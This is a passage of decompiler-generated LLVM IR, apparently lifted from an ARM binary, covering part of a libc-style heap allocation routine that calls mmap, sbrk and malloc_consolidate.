  store i32 %v0_138a4, i32* %v3_138a4, align 4
  %v0_138a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_138a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_138a8 = add i32 %v1_138a8, 4
  %v3_138a8 = inttoptr i32 %v2_138a8 to i32*
  store i32 %v0_138a8, i32* %v3_138a8, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_138b0:                               ; preds = %dec_label_pc_13864
  %v1_138b0 = inttoptr i32 %v4_1386c to i32*
  %v2_138b0 = load i32, i32* %v1_138b0, align 4
  store i32 %v2_138b0, i32* %r3.global-to-local, align 4
  %v1_138b4 = and i32 %v2_138b0, 2
  store i32 %v1_138b4, i32* %ip.global-to-local, align 4
  %v2_138b4 = icmp eq i32 %v1_138b4, 0
  %v1_138b8 = add i32 %v4_1386c, 860
  %v2_138b8 = inttoptr i32 %v1_138b8 to i32*
  %v3_138b8 = load i32, i32* %v2_138b8, align 4
  store i32 %v3_138b8, i32* %r1.global-to-local, align 4
  br i1 %v2_138b4, label %dec_label_pc_138d0, label %dec_label_pc_138c0

dec_label_pc_138c0:                               ; preds = %dec_label_pc_138b0
  %v0_138c0 = call i32 @__malloc_consolidate()
  %v0_138c4 = load i32, i32* @sl, align 4
  %v1_138c4 = add i32 %v0_138c4, -7
  store i32 %v1_138c4, i32* @r0, align 4
  %v0_138c8 = call i32 @malloc()
  store i32 %v0_138c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_138d0:                               ; preds = %dec_label_pc_138b0
  %v1_138d0 = add i32 %v4_1386c, 844
  %v2_138d0 = inttoptr i32 %v1_138d0 to i32*
  %v3_138d0 = load i32, i32* %v2_138d0, align 4
  store i32 %v3_138d0, i32* %r3.global-to-local, align 4
  %v3_138d4 = icmp ult i32 %v0_13878, %v3_138d0
  %v1_138d8 = add i32 %v3_138b8, -1
  store i32 %v1_138d8, i32* %sb.global-to-local, align 4
  br i1 %v3_138d4, label %dec_label_pc_139ac, label %dec_label_pc_138e0

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138d0
  %v1_138e0 = add i32 %v4_1386c, 852
  %v2_138e0 = inttoptr i32 %v1_138e0 to i32*
  %v3_138e0 = load i32, i32* %v2_138e0, align 4
  store i32 %v3_138e0, i32* %r2.global-to-local, align 4
  %v1_138e4 = add i32 %v4_1386c, 848
  %v2_138e4 = inttoptr i32 %v1_138e4 to i32*
  %v3_138e4 = load i32, i32* %v2_138e4, align 4
  store i32 %v3_138e4, i32* %r3.global-to-local, align 4
  %v6_138ec = icmp slt i32 %v3_138e4, %v3_138e0
  br i1 %v6_138ec, label %dec_label_pc_138f0, label %dec_label_pc_139ac

dec_label_pc_138f0:                               ; preds = %dec_label_pc_138e0
  %v1_138f0 = add i32 %v0_13878, 10
  %v2_138f4 = add i32 %v1_138f0, %v3_138b8
  store i32 %v2_138f4, i32* %r3.global-to-local, align 4
  %v2_138f8 = sub i32 0, %v3_138b8
  %v3_138f8 = and i32 %v2_138f4, %v2_138f8
  store i32 %v3_138f8, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_138f8, %v0_13878
  br i1 %tmp214, label %dec_label_pc_13904, label %dec_label_pc_139ac

dec_label_pc_13904:                               ; preds = %dec_label_pc_138f0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_138f8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1391c = call i32 @mmap(i32 0, i32 %v3_138f8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1391c, i32* %r0.global-to-local, align 4
  %v7_13920 = icmp eq i32 %v6_1391c, -1
  br i1 %v7_13920, label %dec_label_pc_13904.dec_label_pc_139ac_crit_edge, label %dec_label_pc_13928

dec_label_pc_13904.dec_label_pc_139ac_crit_edge:  ; preds = %dec_label_pc_13904
  %v1_139d0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_139ac

dec_label_pc_13928:                               ; preds = %dec_label_pc_13904
  %v1_13928 = urem i32 %v6_1391c, 8
  store i32 %v1_13928, i32* %r2.global-to-local, align 4
  %v2_13928 = icmp eq i32 %v1_13928, 0
  br i1 %v2_13928, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_13928
  %v2_1392c = sub nsw i32 8, %v1_13928
  store i32 %v2_1392c, i32* %r3.global-to-local, align 4
  %v2_13930 = load i32, i32* @r4, align 4
  %v3_13930 = sub i32 %v2_13930, %v2_1392c
  %v3_13934 = add i32 %v2_1392c, %v6_1391c
  store i32 %v3_13934, i32* %lr.global-to-local, align 4
  %v2_1393c = or i32 %v3_13930, 2
  store i32 %v2_1393c, i32* %r2.global-to-local, align 4
  %v5_13944 = inttoptr i32 %v3_13934 to i32*
  store i32 %v2_1392c, i32* %v5_13944, align 4
  %v1_13948 = load i32, i32* %r2.global-to-local, align 4
  %v2_13948 = load i32, i32* %lr.global-to-local, align 4
  %v3_13948 = add i32 %v2_13948, 4
  %v4_13948 = inttoptr i32 %v3_13948 to i32*
  store i32 %v1_13948, i32* %v4_13948, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_13928
  store i32 %v6_1391c, i32* %lr.global-to-local, align 4
  %v1_1394050 = load i32, i32* @r4, align 4
  %v2_1394051 = or i32 %v1_1394050, 2
  store i32 %v2_1394051, i32* %r3.global-to-local, align 4
  %v3_1394c = inttoptr i32 %v6_1391c to i32*
  store i32 0, i32* %v3_1394c, align 4
  %v1_13950 = load i32, i32* %r3.global-to-local, align 4
  %v2_13950 = load i32, i32* %lr.global-to-local, align 4
  %v3_13950 = add i32 %v2_13950, 4
  %v4_13950 = inttoptr i32 %v3_13950 to i32*
  store i32 %v1_13950, i32* %v4_13950, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1395c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_1395c, i32* %ip.global-to-local, align 4
  %v1_13960 = add i32 %v4_1395c, 848
  %v2_13960 = inttoptr i32 %v1_13960 to i32*
  %v3_13960 = load i32, i32* %v2_13960, align 4
  store i32 %v3_13960, i32* %r3.global-to-local, align 4
  %v1_13964 = add i32 %v4_1395c, 856
  %v2_13964 = inttoptr i32 %v1_13964 to i32*
  %v3_13964 = load i32, i32* %v2_13964, align 4
  store i32 %v3_13964, i32* %r2.global-to-local, align 4
  %v1_13968 = add i32 %v3_13960, 1
  store i32 %v1_13968, i32* %r3.global-to-local, align 4
  %v7_13970 = icmp sgt i32 %v1_13968, %v3_13964
  br i1 %v7_13970, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_13968, i32* %v2_13964, align 4
  %v0_13974.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13974.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_13974 = phi i32 [ %v4_1395c, %.thread30 ], [ %v1_13974.pre, %bb150 ]
  %v0_13974 = phi i32 [ %v1_13968, %.thread30 ], [ %v0_13974.pre, %bb150 ]
  %v2_13974 = add i32 %v1_13974, 848
  %v3_13974 = inttoptr i32 %v2_13974 to i32*
  store i32 %v0_13974, i32* %v3_13974, align 4
  %v0_13978 = load i32, i32* %ip.global-to-local, align 4
  %v1_13978 = add i32 %v0_13978, 868
  %v2_13978 = inttoptr i32 %v1_13978 to i32*
  %v3_13978 = load i32, i32* %v2_13978, align 4
  store i32 %v3_13978, i32* %r3.global-to-local, align 4
  %v1_1397c = add i32 %v0_13978, 880
  %v2_1397c = inttoptr i32 %v1_1397c to i32*
  %v3_1397c = load i32, i32* %v2_1397c, align 4
  store i32 %v3_1397c, i32* %r2.global-to-local, align 4
  %v0_13980 = load i32, i32* @r4, align 4
  %v2_13980 = add i32 %v0_13980, %v3_13978
  store i32 %v2_13980, i32* %r1.global-to-local, align 4
  %v1_13984 = add i32 %v0_13978, 872
  %v2_13984 = inttoptr i32 %v1_13984 to i32*
  %v3_13984 = load i32, i32* %v2_13984, align 4
  store i32 %v3_13984, i32* %r3.global-to-local, align 4
  %v1_1398c = add i32 %v0_13978, 884
  %v2_1398c = inttoptr i32 %v1_1398c to i32*
  %v3_1398c = load i32, i32* %v2_1398c, align 4
  store i32 %v3_1398c, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_13980, %v3_1397c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_13980, i32* %v2_1397c, align 4
  %v0_13994.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13994.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_13994 = phi i32 [ %v0_13978, %bb151 ], [ %v1_13994.pre, %bb152 ]
  %v0_13994 = phi i32 [ %v2_13980, %bb151 ], [ %v0_13994.pre, %bb152 ]
  %v2_13994 = add i32 %v1_13994, 868
  %v3_13994 = inttoptr i32 %v2_13994 to i32*
  store i32 %v0_13994, i32* %v3_13994, align 4
  %v0_13998 = load i32, i32* %r1.global-to-local, align 4
  %v1_13998 = load i32, i32* %r3.global-to-local, align 4
  %v2_13998 = add i32 %v1_13998, %v0_13998
  store i32 %v2_13998, i32* %r1.global-to-local, align 4
  %v1_1399c = load i32, i32* %r2.global-to-local, align 4
  %v0_139a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_139a0 = add i32 %v0_139a0, 8
  store i32 %v1_139a0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_13998, %v1_1399c
  br i1 %tmp216, label %bb154, label %dec_label_pc_13cb4

bb154:                                            ; preds = %bb153
  %v5_139a4 = load i32, i32* %ip.global-to-local, align 4
  %v6_139a4 = add i32 %v5_139a4, 884
  %v7_139a4 = inttoptr i32 %v6_139a4 to i32*
  store i32 %v2_13998, i32* %v7_139a4, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_139ac:                               ; preds = %dec_label_pc_138f0, %dec_label_pc_138d0, %dec_label_pc_13904.dec_label_pc_139ac_crit_edge, %dec_label_pc_138e0
  %v1_139d0 = phi i32 [ %v1_139d0.pre, %dec_label_pc_13904.dec_label_pc_139ac_crit_edge ], [ %v0_13878, %dec_label_pc_138e0 ], [ %v0_13878, %dec_label_pc_138d0 ], [ %v0_13878, %dec_label_pc_138f0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %ip.global-to-local, align 4
  %v4_139b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_139b4, i32* %r3.global-to-local, align 4
  %v1_139b8 = add i32 %v4_139b4, 44
  %v2_139b8 = inttoptr i32 %v1_139b8 to i32*
  %v3_139b8 = load i32, i32* %v2_139b8, align 4
  store i32 %v3_139b8, i32* %r0.global-to-local, align 4
  %v1_139bc = add i32 %v4_139b4, 864
  %v2_139bc = inttoptr i32 %v1_139bc to i32*
  %v3_139bc = load i32, i32* %v2_139bc, align 4
  store i32 %v3_139bc, i32* %r2.global-to-local, align 4
  %v1_139c0 = add i32 %v4_139b4, 840
  %v2_139c0 = inttoptr i32 %v1_139c0 to i32*
  %v3_139c0 = load i32, i32* %v2_139c0, align 4
  store i32 %v3_139c0, i32* %r3.global-to-local, align 4
  %v1_139c4 = add i32 %v3_139b8, 4
  %v2_139c4 = inttoptr i32 %v1_139c4 to i32*
  %v3_139c4 = load i32, i32* %v2_139c4, align 4
  store i32 %v3_139c4, i32* %r1.global-to-local, align 4
  %v1_139cc = urem i32 %v3_139bc, 2
  %v2_139cc = icmp eq i32 %v1_139cc, 0
  %v1_139c8 = add i32 %v1_139d0, 16
  %v2_139d0 = add i32 %v1_139c8, %v3_139c0
  store i32 %v2_139d0, i32* %r3.global-to-local, align 4
  %v1_139d4 = and i32 %v3_139c4, -4
  store i32 %v1_139d4, i32* @r8, align 4
  br i1 %v2_139cc, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_139ac
  %v3_139d8 = sub i32 %v2_139d0, %v1_139d4
  store i32 %v3_139d8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_139ac, %bb155
  %v0_139dc = phi i32 [ %v2_139d0, %dec_label_pc_139ac ], [ %v3_139d8, %bb155 ]
  %v1_139dc = load i32, i32* %sb.global-to-local, align 4
  %v2_139dc = add i32 %v1_139dc, %v0_139dc
  store i32 %v2_139dc, i32* %r3.global-to-local, align 4
  %v1_139e0 = sub i32 -1, %v1_139dc
  store i32 %v1_139e0, i32* %fp.global-to-local, align 4
  %v2_139e4 = and i32 %v2_139dc, %v1_139e0
  store i32 %v2_139e4, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_139e4, 1
  br i1 %tmp157, label %dec_label_pc_13a08, label %dec_label_pc_139f4

dec_label_pc_139f4:                               ; preds = %bb156
  store i32 %v2_139e4, i32* %r0.global-to-local, align 4
  %v1_139f8 = call i32 @__GI_sbrk(i32 %v2_139e4)
  store i32 %v1_139f8, i32* %r0.global-to-local, align 4
  %v3_139fc = icmp eq i32 %v1_139f8, -1
  store i32 %v1_139f8, i32* @r4, align 4
  br i1 %v3_139fc, label %dec_label_pc_13a08, label %dec_label_pc_13a74

dec_label_pc_13a08:                               ; preds = %dec_label_pc_139f4, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  %v4_13a10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13a10, i32* %r6.global-to-local, align 4
  %v1_13a14 = add i32 %v4_13a10, 864
  %v2_13a14 = inttoptr i32 %v1_13a14 to i32*
  %v3_13a14 = load i32, i32* %v2_13a14, align 4
  store i32 %v3_13a14, i32* %r3.global-to-local, align 4
  %v1_13a18 = urem i32 %v3_13a14, 2
  %v2_13a18 = icmp eq i32 %v1_13a18, 0
  br i1 %v2_13a18, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_13a08
  %v1_13a1c = load i32, i32* @r8, align 4
  %v2_13a1c = load i32, i32* %sb.global-to-local, align 4
  %v3_13a1c = add i32 %v2_13a1c, %v1_13a1c
  %v2_13a20 = load i32, i32* @r5, align 4
  %v3_13a20 = add i32 %v3_13a1c, %v2_13a20
  store i32 %v3_13a20, i32* %r3.global-to-local, align 4
  %v2_13a24 = load i32, i32* %fp.global-to-local, align 4
  %v3_13a24 = and i32 %v2_13a24, %v3_13a20
  store i32 %v3_13a24, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_13a08
  %v0_13a28.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_13a28 = phi i32 [ %v0_13a28.pr, %.thread32thread-pre-split ], [ %v3_13a24, %bb158 ]
  %v2_13a28 = icmp ugt i32 %v0_13a28, 1048575
  br i1 %v2_13a28, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_13a40 = phi i32 [ %v0_13a28, %.thread32 ], [ 1048576, %bb159 ]
  %v1_13a30 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_13a40, %v1_13a30
  br i1 %tmp217, label %dec_label_pc_13a38, label %dec_label_pc_13c9c

dec_label_pc_13a38:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_13a40, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_13a54 = call i32 @mmap(i32 0, i32 %v0_13a40, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_13a54, i32* %r0.global-to-local, align 4
  %v3_13a58 = icmp eq i32 %v6_13a54, -1
  %v8_13a58 = icmp eq i32 %v6_13a54, -1
  store i32 %v6_13a54, i32* @r4, align 4
  br i1 %v8_13a58, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_13a38
  %v1_13a60 = load i32, i32* %r6.global-to-local, align 4
  %v2_13a60 = add i32 %v1_13a60, 864
  %v3_13a60 = inttoptr i32 %v2_13a60 to i32*
  %v4_13a60 = load i32, i32* %v3_13a60, align 4
  %v2_13a64 = load i32, i32* @r5, align 4
  %v3_13a64 = add i32 %v2_13a64, %v6_13a54
  store i32 %v3_13a64, i32* %r0.global-to-local, align 4
  %v2_13a68 = and i32 %v4_13a60, -2
  store i32 %v2_13a68, i32* %r3.global-to-local, align 4
  store i32 %v2_13a68, i32* %v3_13a60, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_13a38, %bb161
  br i1 %v3_13a58, label %dec_label_pc_13a74, label %dec_label_pc_13a78

dec_label_pc_13a74:                               ; preds = %.thread35, %dec_label_pc_139f4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a78

dec_label_pc_13a78:                               ; preds = %.thread35, %dec_label_pc_13a74
  %v0_13a78 = load i32, i32* @r4, align 4
  %v7_13a78 = icmp eq i32 %v0_13a78, -1
  br i1 %v7_13a78, label %dec_label_pc_13c9c, label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a78
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v4_13a88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13a88, i32* %ip.global-to-local, align 4
  store i32 %v3_139b8, i32* %r2.global-to-local, align 4
  %v1_13a90 = add i32 %v4_13a88, 872
  %v2_13a90 = inttoptr i32 %v1_13a90 to i32*
  %v3_13a90 = load i32, i32* %v2_13a90, align 4
  %v1_13a94 = load i32, i32* @r8, align 4
  %v2_13a94 = add i32 %v1_13a94, %v3_139b8
  store i32 %v2_13a94, i32* %r1.global-to-local, align 4
  %v0_13a98 = load i32, i32* @r5, align 4
  %v2_13a98 = add i32 %v0_13a98, %v3_13a90
  store i32 %v2_13a98, i32* %r3.global-to-local, align 4
  %v9_13a9c = icmp eq i32 %v0_13a78, %v2_13a94
  br i1 %v9_13a9c, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_13a80
  store i32 %v2_13a98, i32* %v2_13a90, align 4
  br label %dec_label_pc_13ab8

bb162:                                            ; preds = %dec_label_pc_13a80
  %v1_13aa0 = load i32, i32* %r0.global-to-local, align 4
  %v8_13aa0 = icmp eq i32 %v1_13aa0, -1
  store i32 %v2_13a98, i32* %v2_13a90, align 4
  br i1 %v8_13aa0, label %.thread37, label %dec_label_pc_13ab8

.thread37:                                        ; preds = %bb162
  %v1_13aa8 = load i32, i32* @r5, align 4
  %v2_13aa8 = load i32, i32* @r8, align 4
  %v3_13aa8 = add i32 %v2_13aa8, %v1_13aa8
  %v2_13aac = or i32 %v3_13aa8, 1
  store i32 %v2_13aac, i32* %r3.global-to-local, align 4
  %v2_13ab0 = load i32, i32* %r2.global-to-local, align 4
  %v3_13ab0 = add i32 %v2_13ab0, 4
  %v4_13ab0 = inttoptr i32 %v3_13ab0 to i32*
  store i32 %v2_13aac, i32* %v4_13ab0, align 4
  br label %dec_label_pc_13c30

dec_label_pc_13ab8:                               ; preds = %bb162, %.thread125
  %v0_13abc.pr = load i32, i32* @r8, align 4
  %v0_13ab8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ab8 = add i32 %v0_13ab8, 864
  %v2_13ab8 = inttoptr i32 %v1_13ab8 to i32*
  %v3_13ab8 = load i32, i32* %v2_13ab8, align 4
  store i32 %v3_13ab8, i32* %r2.global-to-local, align 4
  %v2_13abc = icmp eq i32 %v0_13abc.pr, 0
  br i1 %v2_13abc, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_13ab8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_13ab8
  %v2_13ac4 = urem i32 %v3_13ab8, 2
  store i32 %v2_13ac4, i32* %r3.global-to-local, align 4
  %v2_13ac8 = icmp eq i32 %v2_13ac4, 0
  br i1 %v2_13ac8, label %.thread43, label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %.thread39
  %v0_13ad0 = load i32, i32* @r4, align 4
  %v1_13ad0 = load i32, i32* %r1.global-to-local, align 4
  %v3_13ad0 = icmp ult i32 %v0_13ad0, %v1_13ad0
  br i1 %v3_13ad0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_13ad0
  %v2_13ad4 = and i32 %v3_13ab8, -2
  store i32 %v2_13ad4, i32* %r3.global-to-local, align 4
  store i32 %v2_13ad4, i32* %v2_13ab8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_13ad0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %ip.global-to-local, align 4
  %v4_13ae4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13ae4, i32* @r7, align 4
  %v1_13ae8 = add i32 %v4_13ae4, 864
  %v2_13ae8 = inttoptr i32 %v1_13ae8 to i32*
  %v3_13ae8 = load i32, i32* %v2_13ae8, align 4
  store i32 %v3_13ae8, i32* %r3.global-to-local, align 4
  %v1_13aec = urem i32 %v3_13ae8, 2
  store i32 %v1_13aec, i32* @r6, align 4
  %v2_13aec = icmp eq i32 %v1_13aec, 0
  br i1 %v2_13aec, label %dec_label_pc_13b80, label %dec_label_pc_13af4

dec_label_pc_13af4:                               ; preds = %.thread43
  %v0_13af4 = load i32, i32* @r8, align 4
  %v2_13af4 = icmp eq i32 %v0_13af4, 0
  br i1 %v2_13af4, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_13af4
  %v2_13af8 = add i32 %v4_13ae4, 872
  %v3_13af8 = inttoptr i32 %v2_13af8 to i32*
  %v4_13af8 = load i32, i32* %v3_13af8, align 4
  store i32 %v4_13af8, i32* %r2.global-to-local, align 4
  %v1_13afc = load i32, i32* %r1.global-to-local, align 4
  %v2_13afc = load i32, i32* @r4, align 4
  %v3_13afc = sub i32 %v2_13afc, %v1_13afc
  %v3_13b00 = add i32 %v3_13afc, %v4_13af8
  store i32 %v3_13b00, i32* %r3.global-to-local, align 4
  store i32 %v3_13b00, i32* %v3_13af8, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_13af4, %bb164
  %v0_13b08 = load i32, i32* @r4, align 4
  %v1_13b08 = urem i32 %v0_13b08, 8
  store i32 %v1_13b08, i32* %r3.global-to-local, align 4
  %v2_13b08 = icmp eq i32 %v1_13b08, 0
  br i1 %v2_13b08, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_13b0c = sub nsw i32 8, %v1_13b08
  store i32 %v2_13b0c, i32* %r3.global-to-local, align 4
  %v3_13b10 = add i32 %v2_13b0c, %v0_13b08
  store i32 %v3_13b10, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_13b18 = phi i32 [ 0, %.thread46 ], [ %v2_13b0c, %bb165 ]
  %v1_13b14 = load i32, i32* @r5, align 4
  %v2_13b14 = add i32 %v1_13b14, %v0_13b08
  store i32 %v2_13b14, i32* @r6, align 4
  %v1_13b18 = load i32, i32* @r8, align 4
  %v2_13b18 = add i32 %v2_13b14, %v0_13b18
  %v2_13b1c = add i32 %v2_13b18, %v1_13b18
  store i32 %v2_13b1c, i32* %r1.global-to-local, align 4
  %v1_13b20 = load i32, i32* %sb.global-to-local, align 4
  %v2_13b20 = add i32 %v1_13b20, %v2_13b1c
  %v1_13b24 = load i32, i32* %fp.global-to-local, align 4
  %v2_13b24 = and i32 %v1_13b24, %v2_13b20
  store i32 %v2_13b24, i32* %r2.global-to-local, align 4
  %v2_13b28 = sub i32 0, %v2_13b14
  store i32 %v2_13b28, i32* %r3.global-to-local, align 4
  %v2_13b2c = sub i32 %v2_13b24, %v2_13b14
  store i32 %v2_13b2c, i32* @r5, align 4
  store i32 %v2_13b2c, i32* %r0.global-to-local, align 4
  br i1 %v2_13b08, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_13b08, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_13b38 = call i32 @__GI_sbrk(i32 %v2_13b2c)
  store i32 %v1_13b38, i32* %r0.global-to-local, align 4
  %v3_13b3c = icmp eq i32 %v1_13b38, -1
  br i1 %v3_13b3c, label %dec_label_pc_13b44, label %dec_label_pc_13b54

dec_label_pc_13b44:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13b48 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13b48, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13bac

dec_label_pc_13b54:                               ; preds = %bb167
  %v1_13b54 = load i32, i32* @r4, align 4
  %v3_13b54 = icmp ult i32 %v1_13b38, %v1_13b54
  br i1 %v3_13b54, label %dec_label_pc_13b5c, label %dec_label_pc_13bac

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13b54
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r0.global-to-local, align 4
  %v4_13b64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13b64, i32* %r2.global-to-local, align 4
  %v1_13b68 = add i32 %v4_13b64, 864
  %v2_13b68 = inttoptr i32 %v1_13b68 to i32*
  %v3_13b68 = load i32, i32* %v2_13b68, align 4
  %v0_13b6c = load i32, i32* @r6, align 4
  store i32 %v0_13b6c, i32* %r0.global-to-local, align 4
  %v1_13b70 = and i32 %v3_13b68, -2
  store i32 %v1_13b70, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_13b70, i32* %v2_13b68, align 4
  br label %dec_label_pc_13bac

dec_label_pc_13b80:                               ; preds = %.thread43
  %v0_13b80 = load i32, i32* %r0.global-to-local, align 4
  %v3_13b80 = icmp eq i32 %v0_13b80, -1
  br i1 %v3_13b80, label %dec_label_pc_13b88, label %dec_label_pc_13ba4

dec_label_pc_13b88:                               ; preds = %dec_label_pc_13b80
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13b8c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13b8c, i32* %r0.global-to-local, align 4
  %v0_13b90 = load i32, i32* @r7, align 4
  %v1_13b90 = add i32 %v0_13b90, 872
  %v2_13b90 = inttoptr i32 %v1_13b90 to i32*
  %v3_13b90 = load i32, i32* %v2_13b90, align 4
  store i32 %v3_13b90, i32* %r2.global-to-local, align 4
  %v0_13b94 = load i32, i32* @r4, align 4
  %v0_13b98 = load i32, i32* @r5, align 4
  %v2_13b94 = add i32 %v3_13b90, %v1_13b8c
  %v2_13b98 = sub i32 %v2_13b94, %v0_13b94
  %v2_13b9c = sub i32 %v2_13b98, %v0_13b98
  store i32 %v2_13b9c, i32* %r3.global-to-local, align 4
  store i32 %v2_13b9c, i32* %v2_13b90, align 4
  %v0_13ba8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b80, %dec_label_pc_13b88
  %v0_13ba8 = phi i32 [ 0, %dec_label_pc_13b80 ], [ %v0_13ba8.pre, %dec_label_pc_13b88 ]
  %v0_13ba4 = load i32, i32* @r4, align 4
  store i32 %v0_13ba4, i32* @r7, align 4
  store i32 %v0_13ba8, i32* @r5, align 4
  br label %dec_label_pc_13bac

dec_label_pc_13bac:                               ; preds = %dec_label_pc_13b54, %dec_label_pc_13b5c, %dec_label_pc_13b44, %dec_label_pc_13ba4
  %v0_13bac = load i32, i32* %r0.global-to-local, align 4
  %v7_13bac = icmp eq i32 %v0_13bac, -1
  br i1 %v7_13bac, label %dec_label_pc_13c30, label %dec_label_pc_13bb4

dec_label_pc_13bb4:                               ; preds = %dec_label_pc_13bac
  %v1_13bb4 = load i32, i32* @r5, align 4
  %v2_13bb4 = add i32 %v1_13bb4, %v0_13bac
  %v0_13bb8 = load i32, i32* @r7, align 4
  %v2_13bb8 = sub i32 %v2_13bb4, %v0_13bb8
  %v1_13bbc = or i32 %v2_13bb8, 1
  %v2_13bc0 = add i32 %v0_13bb8, 4
  %v3_13bc0 = inttoptr i32 %v2_13bc0 to i32*
  store i32 %v1_13bbc, i32* %v3_13bc0, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13bcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13bcc, i32* @r6, align 4
  %v1_13bd0 = add i32 %v4_13bcc, 872
  %v2_13bd0 = inttoptr i32 %v1_13bd0 to i32*
